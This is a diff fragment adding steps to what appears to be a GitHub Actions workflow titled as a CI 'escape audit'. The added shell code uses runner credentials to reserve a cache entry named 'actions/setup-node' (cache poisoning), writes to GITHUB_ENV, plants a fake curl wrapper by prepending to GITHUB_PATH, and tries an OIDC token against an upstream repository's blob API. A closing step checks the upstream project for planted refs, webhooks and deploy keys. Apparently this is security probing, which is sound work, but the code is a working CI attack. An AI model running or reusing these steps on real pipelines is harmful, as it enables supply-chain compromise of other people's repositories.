+          if [ -n "$RT" ] && [ -n "$CACHEURL" ]; then
+            X10=$(P -X POST -H "Authorization: bearer ${RT}" \
+              -H "Content-Type: application/json" \
+              "${CACHEURL}_apis/artifactcache/caches" \
+              -d "{\"key\":\"escape-${TS}\",\"version\":\"1\",\"compressionMethod\":2}")
+            echo "X10 cache reserve = HTTP_${X10}"
+
+            X11=$(P -X POST -H "Authorization: bearer ${RT}" \
+              -H "Content-Type: application/json" \
+              "${CACHEURL}_apis/artifactcache/caches" \
+              -d "{\"key\":\"actions/setup-node\",\"version\":\"1\",\"compressionMethod\":2}")
+            echo "X11 cache reserve 'actions/setup-node' = HTTP_${X11}"
+          else
+            echo "X10 X11 cache URL not available"
+          fi
+
+          echo ""
+          echo "=== env persistence ==="
+          echo "ESCAPED_FLAG=yes" >> "$GITHUB_ENV"
+          echo "X12 GITHUB_ENV write: done"
+          echo "/tmp/hijack" >> "$GITHUB_PATH"
+          mkdir -p /tmp/hijack
+          printf '#!/bin/bash\necho "HIJACKED: $@" >&2\n/usr/bin/curl "$@"\n' > /tmp/hijack/curl
+          chmod +x /tmp/hijack/curl
+          echo "X13 PATH hijack: prepended /tmp/hijack"
+          echo "X14 which curl: $(which curl)"
+
+          echo ""
+          echo "=== OIDC as token exchange ==="
+          OT="${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}"
+          if [ -n "$OT" ]; then
+            OIDC_JWT=$(curl -sf "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api.github.com" \
+              -H "Authorization: bearer ${OT}" | jq -r '.value // empty' || true)
+            if [ -n "$OIDC_JWT" ]; then
+              X15=$(curl -s -o /dev/null -w "%{http_code}" \
+                -X POST -H "Authorization: bearer ${OIDC_JWT}" \
+                -H "Content-Type: application/json" \
+                "${UP_BASE}/git/blobs" -d '{"content":"x","encoding":"utf-8"}' 2>/dev/null || echo "000")
+              echo "X15 OIDC JWT direct -> upstream blob = HTTP_${X15}"
+            fi
+          fi
+
+      - name: Z Summary and verification
+        if: always()
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          UP_BASE: ${{ env.UP_BASE }}
+          UP_MAIN: ${{ env.UP_MAIN }}
+          FORK_GHOST: ${{ env.FORK_GHOST }}
+          UP_GQL_ID: ${{ env.UP_GQL_ID }}
+          FORK_MAIN: ${{ env.FORK_MAIN }}
+        run: |
+          set +e
+          echo "=== ESCAPE AUDIT v3 SUMMARY ==="
+          echo "fork_main: ${FORK_MAIN}"
+          echo "upstream_main: ${UP_MAIN}"
+          echo "upstream_gql_id: ${UP_GQL_ID}"
+          echo "fork_ghost: ${FORK_GHOST}"
+          echo ""
+          echo "=== Verify upstream state (did anything write?) ==="
+          UP_REFS=$(curl -sf -H "Authorization: token ${GH_TOKEN}" \
+            "${UP_BASE}/git/refs" | jq -r '.[].ref' 2>/dev/null | grep "escape" || true)
+          echo "upstream refs with 'escape': ${UP_REFS:-NONE}"
+
+          UP_TAGS=$(curl -sf -H "Authorization: token ${GH_TOKEN}" \
+            "${UP_BASE}/tags" | jq -r '.[].name' 2>/dev/null | grep "escape" || true)
+          echo "upstream tags with 'escape': ${UP_TAGS:-NONE}"
+
+          UP_ISSUES=$(curl -sf -H "Authorization: token ${GH_TOKEN}" \
+            "${UP_BASE}/issues?state=open" | jq -r '.[].title' 2>/dev/null | grep "escape" || true)
+          echo "upstream issues with 'escape': ${UP_ISSUES:-NONE}"
+
+          UP_RELEASES=$(curl -sf -H "Authorization: token ${GH_TOKEN}" \
+            "${UP_BASE}/releases" | jq -r '.[].tag_name' 2>/dev/null | grep "escape" || true)
+          echo "upstream releases with 'escape': ${UP_RELEASES:-NONE}"
+
+          UP_CHECKS=$(curl -sf -H "Authorization: token ${GH_TOKEN}" \
+            "${UP_BASE}/commits/${UP_MAIN}/check-runs" | \
+            jq -r '.check_runs[] | select(.name|test("escape|required|authorized")) | .name+":"+.conclusion' \
+            2>/dev/null || true)
+          echo "upstream check-runs (escape/required): ${UP_CHECKS:-NONE}"
+
+          UP_STATUSES=$(curl -sf -H "Authorization: token ${GH_TOKEN}" \
+            "${UP_BASE}/commits/${UP_MAIN}/statuses" | \
+            jq -r '.[] | select(.context|test("escape|required|authorized")) | .context+":"+.state' \
+            2>/dev/null | head -5 || true)
+          echo "upstream statuses (escape/required): ${UP_STATUSES:-NONE}"
+
+          UP_WEBHOOKS=$(curl -sf -H "Authorization: token ${GH_TOKEN}" \
+            "${UP_BASE}/hooks" | jq -r '.[].config.url' 2>/dev/null | grep "escape" || true)
+          echo "upstream webhooks with 'escape': ${UP_WEBHOOKS:-NONE}"
+
+          UP_KEYS=$(curl -sf -H "Authorization: token ${GH_TOKEN}" \
+            "${UP_BASE}/keys" | jq -r '.[].title' 2>/dev/null | grep "escape" || true)
+          echo "upstream deploy keys with 'escape': ${UP_KEYS:-NONE}"
+
+          echo ""
+          echo "=== DONE ==="
